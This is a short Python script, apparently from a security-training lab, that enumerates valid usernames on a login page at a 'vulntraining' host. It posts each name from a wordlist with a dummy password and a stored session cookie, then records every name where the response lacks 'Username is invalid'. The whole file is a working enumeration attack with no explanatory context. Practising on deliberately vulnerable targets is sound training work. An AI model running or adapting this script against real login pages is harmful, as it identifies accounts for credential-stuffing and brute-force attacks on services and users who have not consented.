import requests as rq
from time import sleep

url = "http://billing.vulntraining.co.uk/login"
file = "../usernames.txt"

cookie_file = open("../cookie.txt", "r")
cookie = cookie_file.readline().strip()

usernames = []

with open(file, "r") as f:
    for user in f:
        payload = {"username": user, "password": "pass"}
        header = {"Cookie": cookie}
        req = rq.post(url, data= payload, headers= header)
        resp = req.text
        if "Username is invalid" not in resp:
            if req.status_code == 200:
                print(f"[*] Username found: {user}\n")
                usernames.append(user)
        sleep(0.1)
print("*** FOUND ***")
for user in usernames:
    print(user)
    print("\n")